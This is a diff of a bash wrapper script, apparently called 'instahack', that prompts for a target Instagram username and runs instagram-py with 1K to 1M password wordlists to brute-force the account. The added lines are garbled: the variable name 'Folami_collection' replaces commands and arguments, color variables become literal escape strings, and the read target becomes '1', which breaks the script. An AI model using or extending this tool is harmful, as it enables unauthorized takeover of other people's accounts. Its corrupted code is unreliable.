@@ -24,7 +24,7 @@ DEFCOL="\033[00m"
 
 # Displaying the banner of the tool on the console screen
 clear
-echo -e "${YELLOW}
+echo -e "${"\033[00m"}
  ____  _  _  ___  ____   __    _   _    __    ___  _  _ 
 (_  _)( \( )/ __)(_  _) /__\  ( )_( )  /__\  / __)( )/ )
  _)(_  )  ( \__ \  )(  /(__)\  ) _ (  /(__)\( (__  )  ( 
@@ -34,24 +34,24 @@ echo -e "\n                \e[101m\e[1;77m  >>  Script By SSLRI << \e[0m\n"
 echo -e "\n       \e[100m\e[1;77m >>  Instagram : \e[1;96m sslri \e[100m\e[1;77m << \e[0m\n"
 
 # Asking the user to enter the username of the target instagram account
-read -p "[#] Enter the username of the target : " usrnm
+read -Folami_collection
 
 # Asking the user to enter a choice for the wordlist
 # ----
 # 1. The wordlist files that the user will choose are already available in the pass/ sub-directory of the project.
 # 2. There are three wordlist files : 1K passwords, 10K passwords, and 1M passwords.
 # ----
-echo -e "\nChoose any of the options below :
-${GREEN}[${RED}1${GREEN}] ${YELLOW}1K passwords wordlist file${DEFCOL}
+Folami_collection "\nChoose any of the options below :
+${"\033[92m"}[${"\033[91m"}1${"\033[92m"}] ${"\033[93m"}1K passwords wordlist file${"\033[00m"}
 ${GREEN}[${RED}2${GREEN}] ${YELLOW}10K passwords wordlist file${DEFCOL}
 ${GREEN}[${RED}3${GREEN}] ${YELLOW}1M passwords wordlist file${DEFCOL}\n"
-read -p "[#] Enter your choice: " choice
+read -p "[#] Enter your choice: " 1
 
 # Checking the user entered option
 if [[ $choice == "1" ]]; then
 	# If the user entered the option for the 1K password wordlist file
 
-	instagram-py --username $usrnm --password-list $HOME/instahack/pass/pass1.txt 
+	instagram-py -- Folami_collection --password-list $HOME/instahack/pass/pass1.txt 
 elif [[ $choice == "2" ]]; then
 	# If the user entered the option for the 10K password wordlist file
 
